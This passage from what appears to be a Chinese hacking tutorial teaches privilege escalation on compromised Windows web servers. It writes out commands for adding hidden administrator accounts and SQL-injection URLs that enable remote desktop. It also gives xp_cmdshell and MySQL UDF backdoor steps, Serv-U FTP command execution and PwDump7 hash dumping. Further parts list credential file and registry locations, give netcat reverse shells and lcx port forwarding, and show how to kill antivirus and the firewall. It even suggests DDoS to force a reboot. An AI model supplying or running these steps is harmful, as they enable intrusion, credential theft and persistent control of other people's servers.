)输入<code>net user jianmei daxia /add</code></p> <p>9.增加用户并提升为管理员权限之后，如果连接不上3389，上传rootkit.asp脚本，访问会提示登录，用提权成功的账号密码登录进去就可以拥有管理员权限了。</p> <p>10.有时变态监控不让添加用户，可以尝试抓管理哈希值，上传“PwDump7 破解当前管理密码(hash值)”，俩个都上传，执行PwDump7.exe就可以了，之后到网站去解密即可。</p> <p>11.有时增加不上用户，有可能是密码过于简单或是过于复杂，还有就是杀软的拦截，命令 tasklist 查看进程</p> <p>12.其实星外提权只要一个可执行的文件即可，先运行一遍cmd，之后把星外ee.exe命名为log.csv 就可以执行了。</p> <p>13.用wt.asp扫出来的目录，其中红色的文件可以替换成exp，执行命令时cmd那里输入替换的文件路径，下面清空双引号加增加用户的命令。</p> <p>14.提权很无奈的时候，可以试试TV远控，通杀内外网，穿透防火墙，很强大的。</p> <p>15.当可读可写目录存在空格的时候，会出现这样的情况：’C:\Documents’ 不是内部或外部命令，也不是可运行的程序 或批处理文件。解决办法是利用菜刀的交互shell切换到exp路径，如：<code>Cd C:\Documents and Settings\All Users\Application Data\Microsoft</code> 目录
+然后再执行exp或者cmd，就不会存在上面的情况了，aspshell一般是无法跳转目录的～</p> <p>16.有时候可以添加用户，但是添加不到管理组，有可能是administrators改名了，<code>net user administrator</code>看下本地组成员，*administrators</p> <p>17.进入服务器，可以继续内网渗透  这个时候可以尝试打开路由器 默认帐号密码 admin  admin</p> <p>18.有的cmd执行很变态，asp马里，cmd路径填上面，下面填：<code>”&quot;c:\xxx\exp.exe “whoami”</code>  记得前面加两个双引号，不行后面也两个，不行就把exp的路径放在cmd那里，下面不变。</p> <p>19.一般增加不上用户，或是想添加增加用户的vbs,bat,远控小马到服务器的启动项里，用“直接使服务器蓝屏重启的东东”这个工具可以实现，</p> <p>20.执行PwDump7.exe抓哈希值的时候，建议重定向结果到保存为1.txt /c <code>c:\windows\temp\cookies\PwDump7.exe &gt;1.txt</code></p> <p>21.菜刀执行的技巧，上传cmd到可执行目录，右击cmd 虚拟终端，help 然后<code>setp c:\windows\temp\cmd.exe</code> 设置终端路径为：<code>c:\windows\temp\cmd.exe</code></p> <p>22.当不支持aspx，或是支持但跨不了目录的时候，可以上传一个读iis的vps，执行命令列出所有网站目录，找到主站的目录就可以跨过去了。
+上传cscript.exe到可执行目录，接着上传iispwd.vbs到网站根目录，cmd命令/c</p> <p><code>“c:\windows\temp\cookies\cscript.exe” d:\web\iispwd.vbs</code></p> <p>23.如何辨别服务器是不是内网？ 192.168.x.x    172.16.x.x    10.x.x.x</p> <h2 id="dos命令大全"><a href="#dos命令大全" class="header-anchor">#</a> dos命令大全</h2> <p>查看版本：<code>ver</code></p> <p>查看权限：<code>whoami</code></p> <p>查看配置：<code>systeminfo</code></p> <p>查看用户：<code>net user</code></p> <p>查看进程：<code>tasklist</code></p> <p>查看正在运行的服务：<code>tasklist /svc</code></p> <p>查看开放的所有端口：<code>netstat -ano</code></p> <p>查询管理用户名：<code>query user</code></p> <p>查看搭建环境：<code>ftp 127.0.0.1</code></p> <p>查看指定服务的路径：<code>sc qc Mysql</code></p> <p>添加一个用户：<code>net user jianmei daxia.asd /add</code></p> <p>提升到管理权限：<code>net localgroup administrators jianmei /add</code></p> <p>添加用户并提升权限：<code>net user jianmei daxia.asd /add &amp; net localgroup administrators jianmei /add</code></p> <p>查看制定用户信息：<code>net user jianmei</code></p> <p>查看所有管理权限的用户：<code>net localgroup administrators</code></p> <p>加入远程桌面用户组：<code>net localgroup “Remote Desktop Users” jianmei /add</code></p> <p>突破最大连接数：<code>mstsc /admin /v:127.0.0.1</code></p> <p>删除用户：<code>net user jianmei /del</code></p> <p>删除管理员账户:<code>net user administrator daxia.asd</code></p> <p>更改系统登陆密码：<code>net password daxia.asd</code></p> <p>激活GUEST用户：<code>net user guest /active:yes</code></p> <p>开启TELNET服务：<code>net start telnet</code></p> <p>关闭麦咖啡：<code>net stop “McAfee McShield”</code></p> <p>关闭防火墙：<code>net stop sharedaccess</code></p> <p>查看当前目录的所有文件：<code>dir c:\windows\</code></p> <p>查看制定文件的内容：<code>type c:\windows\1.asp</code></p> <p>把cmd.exe复制到c:\windows的temp目录下并命名为cmd.txt：<code>copy c:\windows\temp\cookies\cmd.exe c:\windows\temp\cmd.txt</code></p> <p>开3389端口的命令：<code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></p> <p>查看补丁：<code>dir c:\windows\&gt;a.txt&amp;(for %i in (KB952004.log KB956572.log KB2393802.log KB2503665.log KB2592799.log KB2621440.log KB2160329.log KB970483.log KB2124261.log KB977165.log KB958644.log) do @type a.txt|@find /i “%i”||@echo %i Not Installed!)&amp;del /f /q /a a.txt</code></p> <h2 id="sql语句直接开启3389"><a href="#sql语句直接开启3389" class="header-anchor">#</a> SQL语句直接开启3389</h2> <p>3389登陆关键注册表位置：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>HKEY_LOCAL_MACHINE<span class="token punctuation">\</span>SYSTEM<span class="token punctuation">\</span>CurrentControlSet<span class="token punctuation">\</span>Control<span class="token punctuation">\</span>TerminalServer<span class="token punctuation">\</span>DenyTSConnections
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>其中键值DenyTSConnections 直接控制着3389的开启和关闭，当该键值为0表示3389开启，1则表示关闭。</p> <p>而MSSQL的xp_regwrite的存储过程可以对注册进行修改，我们使用这点就可以简单的修改DenyTSConnections键值，从而控制3389的关闭和开启。</p> <p>开启3389的SQL语句：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>syue.com/xiaohua.asp?id<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token builtin class-name">exec</span> master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,<span class="token string">'SYSTEM\CurrentControlSet\Control\Terminal Server’,'</span>fDenyTSConnections’,'REG_DWORD’,0<span class="token punctuation">;</span>–
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>关闭3389的SQL语句：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>syue.com/xiaohua.asp?id<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token builtin class-name">exec</span> master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,<span class="token string">'SYSTEM\CurrentControlSet\Control\Terminal Server’,'</span>fDenyTSConnections’,'REG_DWORD’,1<span class="token punctuation">;</span>–
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="常见杀软"><a href="#常见杀软" class="header-anchor">#</a> 常见杀软</h2> <ul><li>360tray.exe  360实时保护</li> <li>ZhuDongFangYu.exe  360主动防御</li> <li>KSafeTray.exe  金山卫士</li> <li>McAfee McShield.exe  麦咖啡</li> <li>SafeDogUpdateCenter.exe  服务器安全狗</li></ul> <h2 id="windows提权中敏感目录和敏感注册表的利用"><a href="#windows提权中敏感目录和敏感注册表的利用" class="header-anchor">#</a> Windows提权中敏感目录和敏感注册表的利用</h2> <table><thead><tr><th>敏感目录</th> <th>目录权限</th> <th>提权用途</th></tr></thead> <tbody><tr><td>C:\Program Files\</td> <td>默认用户组users对该目录拥有查看权</td> <td>可以查看服务器安装的应用软件</td></tr> <tr><td>C:\Documents and Settings\All Users\「开始」菜单\程序</td> <td>Everyone拥有查看权限</td> <td>存放快捷方式，可以下载文件，属性查看安装路径</td></tr> <tr><td>C:\Documents and Settings\All Users\Documents</td> <td>Everyone完全控制权限</td> <td>上传执行cmd及exp</td></tr> <tr><td>C:\windows\system32\inetsrv\</td> <td>Everyone完全控制权限</td> <td>上传执行cmd及exp</td></tr> <tr><td>C:\windows\my.iniC:\Program Files\MySQL\MySQL Server 5.0\my.ini</td> <td>默认用户组users拥有查看权限</td> <td>安装mysql时会将root密码写入该文件</td></tr> <tr><td>C:\windows\system32\</td> <td>默认用户组users拥有查看权限</td> <td>Shift后门一般是在该文件夹，可以下载后门破解密码</td></tr> <tr><td>C:\Documents and Settings\All Users\「开始」菜单\程序\启动</td> <td>Everyone拥有查看权限</td> <td>可以尝试向该目录写入vbs或bat，服务器重启后运行。</td></tr> <tr><td>C:\RECYCLER\D:\RECYCLER\</td> <td>Everyone完全控制权限</td> <td>回收站目录。常用于执行cmd及exp</td></tr> <tr><td>C:\Program Files\Microsoft SQL Server\</td> <td>默认用户组users对该目录拥有查看权限</td> <td>收集mssql相关信息，有时候该目录也存在可执行权限</td></tr> <tr><td>C:\Program Files\MySQL\</td> <td>默认用户组users对该目录拥有查看权限</td> <td>找到MYSQL目录中user.MYD里的root密码</td></tr> <tr><td>C:\oraclexe\</td> <td>默认用户组users对该目录拥有查看权限</td> <td>可以尝试利用Oracle的默认账户提权</td></tr> <tr><td>C:\WINDOWS\system32\config</td> <td>默认用户组users对该目录拥有查看权限</td> <td>尝试下载sam文件进行破解提权</td></tr> <tr><td>C:\Program Files\Geme6 FTP Server\Remote Admin\Remote.ini</td> <td>默认用户组users对该目录拥有查看权限</td> <td>Remote.ini文件中存放着G6FTP的密码</td></tr> <tr><td>c:\Program Files\RhinoSoft.com\Serv-U\c:\Program Files\Serv-U\</td> <td>默认用户组users对该目录拥有查看权限</td> <td>ServUDaemon.ini 中存储了虚拟主机网站路径和密码</td></tr> <tr><td>C:\windows\system32\inetsrv\MetaBase.xml</td> <td>默认用户组users对该目录拥有查看权限</td> <td>IIS配置文件</td></tr> <tr><td>C:tomcat\conf\resin.conf</td> <td>默认用户组users对该目录拥有查看权限</td> <td>Tomat存放密码的位置</td></tr> <tr><td>C:\ZKEYS\Setup.ini</td> <td>默认用户组users对该目录拥有查看权限</td> <td>ZKEYS虚拟主机存放密码的位置</td></tr></tbody></table> <h2 id="提权中的敏感注册表位置"><a href="#提权中的敏感注册表位置" class="header-anchor">#</a> 提权中的敏感注册表位置</h2> <p>Mssql端口</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>HKEY_LOCAL_MACHINE<span class="token punctuation">\</span>SOFTWARE<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>MSSQLServer<span class="token punctuation">\</span>MSSQLServer<span class="token punctuation">\</span>SuperSocketNetLib<span class="token punctuation">\</span>Tcp    
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>远程终端 值为0 即为开启</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>HKLM<span class="token punctuation">\</span>SYSTEM<span class="token punctuation">\</span>CurrentControlSet<span class="token punctuation">\</span>Control<span class="token punctuation">\</span>Terminal Server DenyTSConnections         
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>mssql的注册表位置</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>HKEY_LOCAL_MACHINE<span class="token punctuation">\</span>SOFTWARE<span class="token punctuation">\</span>MySQL AB<span class="token punctuation">\</span>  
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>华众主机注册表配置位置</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>HKEY_LOCAL_MACHINE<span class="token punctuation">\</span>SOFTWARE<span class="token punctuation">\</span>HZHOST<span class="token punctuation">\</span>CONFIG<span class="token punctuation">\</span>    
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>serv-u的用户及密码（su加密）位置</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>HKEY_LOCAL_MACHINE<span class="token punctuation">\</span>SOFTWARE<span class="token punctuation">\</span>Cat Soft<span class="token punctuation">\</span>Serv-U<span class="token punctuation">\</span>Domains<span class="token punctuation">\</span><span class="token number">1</span><span class="token punctuation">\</span>UserList<span class="token punctuation">\</span>   
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>在该注册表位置PortNumber的值即位3389端口值</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>HKEY_LOCAL_MACHINE<span class="token punctuation">\</span>SYSTEM<span class="token punctuation">\</span>CurrentControlSet<span class="token punctuation">\</span>Control<span class="token punctuation">\</span>TerminalServer<span class="token punctuation">\</span> WinStations<span class="token punctuation">\</span>RDP-Tcp
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>mysql管理工具Navicat的注册表位置，提权运用请谷歌</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>HKEY_CURRENT_USER<span class="token punctuation">\</span>Software<span class="token punctuation">\</span>PremiumSoft<span class="token punctuation">\</span>Navicat<span class="token punctuation">\</span>Servers
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>Radmin的配置文件，提权中常将其导出进行进行覆盖提权</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>HKEY_LOCAL_MACHINE<span class="token punctuation">\</span>SYSTEM<span class="token punctuation">\</span>RAdmin<span class="token punctuation">\</span>v2.0<span class="token punctuation">\</span>Server<span class="token punctuation">\</span>Parameters   
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>IIS注册表全版本泄漏用户路径和FTP用户名漏洞</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>HKEY_LOCAL_MACHINE<span class="token punctuation">\</span>SYSTEM<span class="token punctuation">\</span>ControlSet002<span class="token punctuation">\</span>Services<span class="token punctuation">\</span>MSFtpsvc<span class="token punctuation">\</span>Parameters<span class="token punctuation">\</span>Virtual Roots<span class="token punctuation">\</span>      
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>华众主机在注册表中保存的mssql、mysql等密码</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>HKEY_LOCAL_MACHINE<span class="token punctuation">\</span>software<span class="token punctuation">\</span>hzhost<span class="token punctuation">\</span>config<span class="token punctuation">\</span>Settings<span class="token punctuation">\</span>mastersvrpass  
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>星外主机mssql 的sa账号密码，双MD5加密</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>HKEY_LOCAL_MACHINE<span class="token punctuation">\</span>SYSTEM<span class="token punctuation">\</span>LIWEIWENSOFT<span class="token punctuation">\</span>INSTALLFREEADMIN<span class="token punctuation">\</span><span class="token number">11</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>星外ftp的注册表位置，当然也包括ControlSet001、ControlSet003</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>HKEY_LOCAL_MACHINE<span class="token punctuation">\</span>SYSTEM<span class="token punctuation">\</span>ControlSet002<span class="token punctuation">\</span>Services<span class="token punctuation">\</span>MSFtpsvc<span class="token punctuation">\</span>Parameters<span class="token punctuation">\</span>Virtual Roots<span class="token punctuation">\</span>ControlSet002  
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="wscript-shell的删除和恢复"><a href="#wscript-shell的删除和恢复" class="header-anchor">#</a> wscript.shell的删除和恢复</h2> <p>载wscript.shell对象，在cmd下或直接运行：<code>regsvr32 /u %windir%\system32\WSHom.Ocx</code></p> <p>卸载FSO对象，在cmd下或直接运行：<code>regsvr32.exe /u %windir%\system32\scrrun.dll</code></p> <p>卸载stream对象，在cmd下或直接运行：<code>regsvr32 /s /u “C:\ProgramFiles\CommonFiles\System\ado\msado15.dll”</code></p> <p>如果想恢复的话只需要去掉/U 即可重新再注册以上相关ASP组件，这样子就可以用了</p> <h2 id="如何找到准确的终端连接端口"><a href="#如何找到准确的终端连接端口" class="header-anchor">#</a> 如何找到准确的终端连接端口？</h2> <p>在aspx大马里，点击“系统信息”第三个就是目前的3389端口</p> <p>或是执行命令查看正在运行的服务：<code>tasklist /svc</code></p> <p>找到：<code>svchost.exe 1688 TermService</code></p> <p>记住1688这个ID值，</p> <p>查看开放的所有端口：<code>netstat -ano</code></p> <p>找到1688这个ID值所对应的端口就是3389目前的端口</p> <h2 id="iis6提权提示can-not-find-wmiprvse-exe的突破方法"><a href="#iis6提权提示can-not-find-wmiprvse-exe的突破方法" class="header-anchor">#</a> iis6提权提示Can not find wmiprvse.exe的突破方法</h2> <p><strong>突破方法一：</strong></p> <p>在IIS环境下，如果权限做得不严格，我们在aspx大马里面是有权限直接结束wmiprvse.exe进程的，进程查看里面直接K掉</p> <p>在结束之后，它会再次运行，这时候的PID值的不一样的。这时候我们回来去运行exp，直接秒杀。</p> <p><strong>突破方法二：</strong></p> <p>虚拟主机，一般权限严格限制的，是没权限结束的，这时候我们可以考虑配合其他溢出工具让服务器强制重启，比如“直接使服务器蓝屏重启的东东”</p> <p>甚至可以暴力点，DDOS秒杀之，管理发现服务器不通了首先肯定是以为服务器死机，等他重启下服务器（哪怕是IIS重启下）同样秒杀之。</p> <h2 id="本地溢出提权"><a href="#本地溢出提权" class="header-anchor">#</a> 本地溢出提权</h2> <p>计算机有个地方叫缓存区,程序的缓存区长度是被事先设定好的,如果用户输入的数据超过了这个缓存区的长度,那么这个程序就会溢出了.</p> <p>缓存区溢出漏洞主要是由于许多软件没有对缓存区检查而造成的.</p> <p>利用一些现成的造成溢出漏洞的exploit通过运行,把用户从users组或其它系统用户中提升到administrators组.</p> <p>想要执行cmd命令，就要wscript.shell组建支持，或是支持aspx脚本也行，因为aspx脚本能调用.net组件来执行cmd的命令.</p> <h2 id="sa提权"><a href="#sa提权" class="header-anchor">#</a> sa提权</h2> <p>扫描开放的端口，1433开了就可以找sa密码提权，用大马里的搜索文件功能，sa密码一般在conn.asp config.asp web.config 这三个文件</p> <p>也可以通过注册表找配置文件，看下支持aspx不，支持的话跨目录到别的站点上找，找到之后用aspshell自带的sql提权登录再执行命令创建用户即可。</p> <p>aspx马提权执行命令有点不一样，点击数据库管理</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>MSSQL– <span class="token assign-left variable">server</span><span class="token operator">=</span>localhost<span class="token punctuation">;</span><span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span>sa<span class="token punctuation">;</span><span class="token assign-left variable"><span class="token environment constant">PWD</span></span><span class="token operator">=</span><span class="token punctuation">;</span><span class="token assign-left variable">database</span><span class="token operator">=</span>master<span class="token punctuation">;</span><span class="token assign-left variable">Provider</span><span class="token operator">=</span>SQLOLEDB–输入帐号密码连接即可
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>增加一个用户：<code>exec master.dbo.xp_cmdshell ‘net user jianmei daxia.asd /add’;–</code>
+提升为管理员：<code>exec master.dbo.xp_cmdshell ‘net localgroup administrators jianmei /add’;–</code></p> <p>PS:如果增加不上，说明是xp_cmdshell组建没有，增加xp_cmdshell组建：<code>Use master dbcc addextendedproc(‘xp_cmdshell’,'xplog70.dll’)</code></p> <h2 id="root提权"><a href="#root提权" class="header-anchor">#</a> root提权</h2> <p>利用mysql提权的前提就是,服务器安装了mysql,mysql的服务没有降权,是默认安装以系统权限继承的(system权限). 并且获得了root的账号密码</p> <p>如何判断一台windows服务器上的mysql有没有降权？
+cmd命令net user 如果存在 mysql mssql这样用户或者类似的.通常就是它的mssql mysql服务已经被降权运行了</p> <p>如何判断服务器上是否开启了mysql服务？
+开了3306端口，有的管理员会把默认端口改掉.另一个判断方法就是网站是否支持php,一般支持的话都是用mysql数据库的.</p> <h2 id="如何查看root密码"><a href="#如何查看root密码" class="header-anchor">#</a> 如何查看root密码？</h2> <p>在mysql的安装目录下找到user.myd这个文件，root就藏在里面，一般是40位cmd加密，一些php网站安装的时候用的是root用户,在conn.asp config.asp这些文件里。
+有时会显得很乱，这时就需要自己去组合，前17位在第一行可以找到，还有23位在第三行或是其他行，自己继续找。</p> <p>可以直接用php脚本里“mysql执行”，或是上传个UDF.php，如果网站不支持PHP，可以去旁一个php的站，也可以把UDF.php上传到别的phpshell上也可以。</p> <p>填入帐号密码之后，自然就是安装DLL了，点击“自动安装Mysql BackDoor” 显示导出跟创建函数成功后，紧接着执行增加用户的命令即可。</p> <p>注意：5.0版本以下(包括5.0的)默认c:\windows\系统目录就可以了，5.1版本以上的不能导出到系统目录下创建自定义函数，只能导出在mysql安装目录下的lib/plugin目录中</p> <p>例如：<code>D:/Program Files/MySQL/MySQL Server 5.1/lib/plugin/mysql.dll</code></p> <p>如果密码看不见，或是组合不到40位，就本地安装一个mysql吧，
+1、停止mysql服务
+2、替换下载下来的3个文件（user.MYI user.MYD user.frm）
+3、cmd切换到bin目录下，进入mysql安全模式，cmd命令：mysqld-nt –skip-grant-tables
+4、重新打开一个cmd 切换到bin目录下，cmd命令：mysql -u root  版本不同有可能是：mysql -uroot -proot
+5、最后查询一下就出来了select user,password from mysql.user;</p> <h2 id="serv-u提权"><a href="#serv-u提权" class="header-anchor">#</a> serv-u提权</h2> <p>这个文件里包含serv-u的md5密码：<code>C:\Program Files\RhinoSoft.com\Serv-U\\ServUDaemon.ini</code></p> <p>找到这个文件：ServUDaemon.ini 打开找到：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token assign-left variable">LocalSetupPassword</span><span class="token operator">=</span>nqFCE64E0056362E8FCAF813094EC39BC2
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>再拿md5密文去解密，再用现在的密码登陆提权即可。</p> <p>serv-u提权的前提是43958端口开了，且知道帐号密码！</p> <p>如果帐号密码默认，直接用shell里面的serv-u提权功能即可搞定，建议用aspx马、php马去提权，因为可以看回显。</p> <p>530说明密碼不是默认的,回显330说明成功，900说明密码是默认的……………..</p> <p>在程序里找个快捷方式，或是相关的文件进行下载到本地，再查看文件的属性，就可以找到serv-u的安装目录了。</p> <p>目录有修改权限之serv-u提权：</p> <p>找到serv-u的目录，再找到用户的配置文件ServUDaemon.ini，直接增加一个用户代码，保存！</p> <p>接着本地cmd命令：ftp 服务器ip</p> <p>回车，输入帐号密码再回车………………….</p> <p>接着先试试普通的cmd命令提权，不行的话就使用ftp提权的命令：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>Quote site <span class="token builtin class-name">exec</span> net user jianmei daxia /add   增加一个用户
+Quote site <span class="token builtin class-name">exec</span> net localgroup administrators jianmei /add   提升到管理员权限
+<span class="token number">200</span> EXEC <span class="token builtin class-name">command</span> successful <span class="token punctuation">(</span>TID<span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">)</span>.   执行成功的回显信息
+<span class="token assign-left variable">Maintenance</span><span class="token operator">=</span>System   权限类型多加一行指定新加帐号为系统管理员
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><code>ReloadSettings=True</code>  在修改ini文件后需加入此项，这时serv-u会自动刷新配置文件并生效</p> <h2 id="端口转发"><a href="#端口转发" class="header-anchor">#</a> 端口转发</h2> <p>什么情况下适合转发端口？</p> <p>1.服务器是内网，我们无法连接。
+2.服务器上有防火墙，阻断我们的连接。</p> <p>转发端口的前提，我们是外网或是有外网服务器。</p> <p>找个可读可写目录上传lcx.exe</p> <p>本地cmd命令：<code>lcx.exe -listen 1988 4567 （监听本地1988端口并转发到4567端口）</code></p> <p>接着shell命令：<code>/c c:\windows\temp\cookies\lcx.exe -slave 本机ip 1988 服务器ip 3389 （把服务器3389端口转发到本地4567端口）</code></p> <p>之后本地连接：127.0.0.1:4567  (如果不想加上:4567的话，本地执行命令的时候，把4567换成3389来执行就行了)</p> <p>以上是本机外网情况下操作，接着说下在外网服务器里如何操作：</p> <p>上传lxc.exe cmd.exe到服务器且同一目录，执行cmd.exe命令：lcx.exe -listen 1988 4567</p> <p>接着在aspxshell里点击端口映射，远程ip改为站点的ip，远端口程填1988，点击映射端口，接着在服务器里连接127.0.0.1:4567就可以了。
+(( nc反弹提权 ))</p> <p>当可以执行net user，但是不能建立用户时，就可以用NC反弹提权试下，特别是内网服务器，最好用NC反弹提权。</p> <p>不过这种方法, 只要对方装了防火墙, 或是屏蔽掉了除常用的那几个端口外的所有端口，那么这种方法也失效了….</p> <p>找个可读可写目录上传nc.exe cmd.exe</p> <ul><li>-l  监听本地入栈信息</li> <li>-p  port打开本地端口</li> <li>-t  以telnet形式应答入栈请求</li> <li>-e  程序重定向</li></ul> <p>本地cmd执行：<code>nc -vv -l -p 52 进行反弹</code></p> <p>接着在shell里执行命令：<code>c:\windows\temp\nc.exe -vv 服务器ip 999 -e c:\windows\temp\cmd.exe</code>   最好是80或8080这样的端口，被防火墙拦截的几率小很多</p> <p>执行成功后本地cmd命令：cd/  （只是习惯而已）</p> <p>接着以telnet命令连接服务器：telnet 服务器ip 999</p> <p>回车出现已选定服务器的ip就说明成功了，接着权限比较大了，尝试建立用户！</p> <p>本地cmd执行：<code>nc -vv -l -p 52 进行反弹</code> <code>c:\windows\temp\nc.exe -e c:\windows\temp\cmd.exe 服务器ip 52</code></p> <p>shell执行命令<code>c:\windows\temp\nc.exe -l -p 110 -t -e c:\windows\temp\cmd.exe</code></p> <p>一般这样的格式执行成功率很小，不如直接在cmd那里输入：<code>c:\windows\temp\nc.exe 命令这里输入：-vv 服务器ip 999 -e c:\windows\temp\cmd.exe</code></p> <p>这个技巧成功率比上面那个大多了，不单单是nc可以这样，pr这些提权exp也是可以的。</p> <h2 id="星外提权"><a href="#星外提权" class="header-anchor">#</a> 星外提权</h2> <p>如何知道是不是星外主机？</p> <p>第一：网站物理路径存在“freehost”
+第二：asp马里点击程序，存在“7i24虚拟主机管理平台”“星外主机”之类的文件夹</p> <p>默认帐号：freehostrunat
+默认密码：fa41328538d7be36e83ae91a78a1b16f!7</p> <p>freehostrunat这个用户是安装星外时自动建立的，已属于administrators管理组，而且密码不需要解密，直接登录服务器即可</p> <p>星外常写目录：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>C:<span class="token punctuation">\</span>RECYCLER<span class="token punctuation">\</span>
+C:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>temp<span class="token punctuation">\</span>
+e:<span class="token punctuation">\</span>recycler<span class="token punctuation">\</span>
+f:<span class="token punctuation">\</span>recycler<span class="token punctuation">\</span>
+C:<span class="token punctuation">\</span>php<span class="token punctuation">\</span>PEAR<span class="token punctuation">\</span>
+C:<span class="token punctuation">\</span>WINDOWS<span class="token punctuation">\</span>7i24.com<span class="token punctuation">\</span>FreeHost
+C:<span class="token punctuation">\</span>php<span class="token punctuation">\</span>dev
+C:<span class="token punctuation">\</span>System Volume Information
+C:<span class="token punctuation">\</span>7i24.com<span class="token punctuation">\</span>serverdoctor<span class="token punctuation">\</span>log<span class="token punctuation">\</span>
+C:<span class="token punctuation">\</span>WINDOWS<span class="token punctuation">\</span>Temp<span class="token punctuation">\</span>
+c:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>hchiblis.ibl
+C:<span class="token punctuation">\</span>7i24.com<span class="token punctuation">\</span>iissafe<span class="token punctuation">\</span>log<span class="token punctuation">\</span>
+C:<span class="token punctuation">\</span>7i24.com<span class="token punctuation">\</span>LinkGate<span class="token punctuation">\</span>log
+C:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Thunder Network<span class="token punctuation">\</span>Thunder7<span class="token punctuation">\</span>
+C:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Thunder Network<span class="token punctuation">\</span>Thunder<span class="token punctuation">\</span>
+C:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Symantec AntiVirus<span class="token punctuation">\</span>SAVRT<span class="token punctuation">\</span>
+c:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>DriverPacks<span class="token punctuation">\</span>C<span class="token punctuation">\</span>AM2
+C:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>FlashFXP<span class="token punctuation">\</span>
+c:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Microsoft SQL Server<span class="token punctuation">\</span><span class="token number">90</span><span class="token punctuation">\</span>Shared<span class="token punctuation">\</span>ErrorDumps<span class="token punctuation">\</span>
+C:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Zend<span class="token punctuation">\</span>ZendOptimizer-3.3.0<span class="token punctuation">\</span>
+C:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Common Files<span class="token punctuation">\</span>
+c:<span class="token punctuation">\</span>Documents and Settings<span class="token punctuation">\</span>All Users<span class="token punctuation">\</span>Application Data<span class="token punctuation">\</span>Hagel Technologies<span class="token punctuation">\</span>DU Meter<span class="token punctuation">\</span>log.csv
+c:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span><span class="token number">360</span><span class="token punctuation">\</span>360Safe<span class="token punctuation">\</span>deepscan<span class="token punctuation">\</span>Section<span class="token punctuation">\</span>mutex.db
+c:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Helicon<span class="token punctuation">\</span>ISAPI_Rewrite3<span class="token punctuation">\</span>error.log
+c:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Helicon<span class="token punctuation">\</span>ISAPI_Rewrite3<span class="token punctuation">\</span>Rewrite.log
+c:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Helicon<span class="token punctuation">\</span>ISAPI_Rewrite3<span class="token punctuation">\</span>httpd.conf
+c:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Common Files<span class="token punctuation">\</span>Symantec Shared<span class="token punctuation">\</span>Persist.bak
+c:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Common Files<span class="token punctuation">\</span>Symantec Shared<span class="token punctuation">\</span>Validate.dat
